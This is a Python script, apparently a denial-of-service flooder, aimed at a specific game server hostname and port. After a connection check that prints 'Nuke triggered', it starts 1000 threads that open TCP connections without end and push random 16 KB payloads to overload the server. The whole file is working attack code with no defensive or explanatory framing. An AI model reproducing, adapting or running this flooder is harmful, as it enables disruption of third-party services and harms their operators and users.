import socket
import random
import threading
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# Server settings
target_ip = "DiamondMiner.mc.gg"
target_port = 25696

# Function to check the server connection
def check_connection():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((target_ip, target_port))
        sock.close()
        print(Fore.GREEN + "Connection successful " + Fore.YELLOW + "Nuke triggered")
        return True
    except Exception as e:
        print(Fore.RED + f"Connection failed: {e}")
        return False

# Function to send random packets
def attack_thread():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(random._urandom(16384))  # Send random data
            sock.close()
        except Exception as e:
            pass

# Function to start the attack using multiple threads
def start_attack():
    for i in range(1000):  # Increase the number of threads for higher load
        thread = threading.Thread(target=attack_thread)
        thread.start()

# Check connection and start the attack if connected successfully
if check_connection():
    start_attack()